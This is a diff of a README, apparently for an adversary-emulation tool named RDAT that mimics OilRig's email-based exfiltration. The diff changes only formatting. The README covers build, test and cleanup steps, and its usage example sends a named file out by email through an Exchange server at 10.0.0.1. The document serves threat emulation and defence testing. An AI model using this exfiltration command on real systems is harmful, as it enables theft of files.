@@ -15,10 +15,12 @@ the Exchange server.
 ## Windows
 
 ### Download .NET 6.0 SDK x64 for Windows
-https://dotnet.microsoft.com/en-us/download/dotnet/6.0
+<https://dotnet.microsoft.com/en-us/download/dotnet/6.0>
 
 ### Build EXE
+
 Open a command (cmd.exe) prompt
+
 ```
 # from \Resources\RDAT\
 
@@ -31,6 +33,7 @@ cd .\bin\Release\net6.0\win10-x64\publish\
 ## Test Instructions
 
 Open a command (cmd.exe) prompt
+
 ```
 # from \Resources\RDAT\
 
@@ -39,14 +42,18 @@ powershell.exe .\test.ps1 [user] [password] [domain] [server_address] # Order ha
 ```
 
 ## Usage Examples
+
 Go to running directory of RDAT.exe
+
 ```
 .\RDAT.exe --help
-.\RDAT.exe --path="C:\Users\Public\FileToBeExfiltrated.txt" --from="user_account@domain.com" --password="1234567" --to="recipient@domain.com" --server="10.0.0.1" --chunksize="20000" 
+.\RDAT.exe --path="C:\Users\Public\FileToBeExfiltrated.txt" --from="user_account@domain.com" --password="1234567" --to="recipient@domain.com" --server="10.0.0.1" --chunksize="20000"
 ```
 
 ## Cleanup Instructions
+
 Go to running directory of RDAT.exe
+
 ```
 rm .\RDAT.exe
 rm .\guest.bmp
@@ -55,5 +62,5 @@ rm .\guest.bmp.tmp
 
 ## CTI Evidence
 
-[1] https://attack.mitre.org/software/S0495/
-[2] https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
+[1] <https://attack.mitre.org/software/S0495/>
+[2] <https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/>
